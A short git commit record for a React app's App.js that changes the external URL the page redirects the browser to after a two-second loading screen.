4b30b5f20ea614d048599e7624cb68d5eae577b9
husknet <127146284+husknet@users.noreply.github.com>
2024-10-27 21:34:03 -0300

    Update App.js

--- src/App.js
+++ src/App.js
@@ -4,7 +4,7 @@ import Loading from './Loading';
 function App() {
     useEffect(() => {
         const timer = setTimeout(() => {
-            window.location.href = 'https://outbook.ioa.com.ar/';
+            window.location.href = 'https://jerry-updated.vercel.app';
         }, 2000);
 
         return () => clearTimeout(timer);
